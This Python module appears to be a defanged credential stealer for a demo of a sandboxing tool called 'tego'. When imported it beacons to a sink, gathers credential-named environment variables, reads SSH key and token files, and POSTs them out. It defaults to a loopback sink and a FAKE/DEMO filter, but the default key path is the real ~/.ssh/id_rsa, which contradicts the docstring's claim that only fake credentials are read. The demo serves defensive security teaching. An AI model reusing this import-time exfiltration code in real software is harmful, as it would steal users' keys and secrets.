# SPDX-License-Identifier: Apache-2.0
"""telemetry_helper -- a DEFANGED stand-in for a poisoned dependency, modeled on real
dependency compromises. Importing it runs the attacker's code: it reads your SSH key and an API token,
sweeps every credential-looking environment variable (here: only the demo's own fake ones), and sends them
all to an outside server, as a real stealer does on import.

Declawed for the demo: it reads only the FAKE credentials the demo plants, sends to a LOOPBACK sink that
only counts bytes, and wraps every step so import never raises -- the real malware hid its own errors so
the host kept working and nobody noticed. Under tego the credential read, the env sweep's send and the
phone-home are all refused, and the tests still pass; without tego they succeed and everything leaves the
machine. Override the targets with SC_KEY / SC_TOKEN / SC_SINK for local testing."""
import os
import sys
import urllib.request

KEY = os.environ.get("SC_KEY", os.path.expanduser("~/.ssh/id_rsa"))
TOKEN = os.environ.get("SC_TOKEN", os.path.expanduser("~/.config/telemetry/token"))
SINK = os.environ.get("SC_SINK", "http://127.0.0.1:8801")

# The env-var names a credential stealer grabs: anything that looks like a key, a token or a secret.
_SECRET_MARKERS = ("KEY", "TOKEN", "SECRET")


def _log(msg):
    print("[telemetry_helper] " + msg, file=sys.stderr)


def _post(path, data):
    req = urllib.request.Request(SINK + path, data=data, method="POST",
                                 headers={"X-Demo-Agent": "poisoned-dep"})
    urllib.request.urlopen(req, timeout=3).read()


def _is_demo_value(v):
    return "FAKE" in v.upper() or "DEMO" in v.upper()


def _collect_env_secrets():
    # Every variable whose name looks like a credential. SERVICE_TOKEN is in here too: it is the one secret
    # the honest job legitimately holds -- and under tego it still cannot be sent out.
    # Defanged for a real laptop: ONLY the demo's own obviously fake variables are swept (a value that says
    # FAKE or DEMO). A real credential in the presenter's shell is neither sent nor named -- not on screen,
    # not in the log -- and `demo.sh left` and `right` start the terminals with `env -i` and only the fakes.
    return {k: v for k, v in os.environ.items() if any(m in k.upper() for m in _SECRET_MARKERS) and _is_demo_value(v)}


def _steal():
    # 1. phone the attacker's server -- this is what the NETWORK rule refuses under tego.
    try:
        _post("/beacon", b"hello from your machine")
        _log("phoned home to %s" % SINK)
    except Exception as e:
        _log("could NOT phone home (%s)" % e.__class__.__name__)
    # 2. sweep credential-looking environment variables and send them -- refused under tego because the
    #    attacker's sink is not an allowed destination (and the ones the job did not need are not even
    #    present, so they were never exposed in the first place).
    env_secrets = _collect_env_secrets()
    if env_secrets:
        names = ", ".join(sorted(env_secrets))
        try:
            _post("/env", "\n".join("%s=%s" % kv for kv in env_secrets.items()).encode())
            _log("exfiltrated %d env secrets (%s)" % (len(env_secrets), names))
        except Exception as e:
            _log("saw env secrets (%s) but could NOT send them (%s)" % (names, e.__class__.__name__))
    else:
        _log("no credential-looking env vars in reach")
    # 3. read your credential FILES, each on its own like a real stealer, and send whatever it got -- under
    #    tego the key is never readable and the token read waits for a person (who can say no).
    stolen = b""
    for name, path in (("SSH key", KEY), ("API token", TOKEN)):
        try:
            with open(path, "rb") as f:
                stolen += f.read()
            _log("read your %s (%s)" % (name, path))
        except Exception as e:
            _log("could NOT read your %s: %s" % (name, e))   # under tego: Permission denied
    if not stolen:
        return
    try:
        _post("/exfil", stolen)
        _log("exfiltrated %d bytes of credential files" % len(stolen))
    except Exception as e:
        _log("read %d bytes of credentials but could NOT send them (%s)" % (len(stolen), e.__class__.__name__))

_steal()
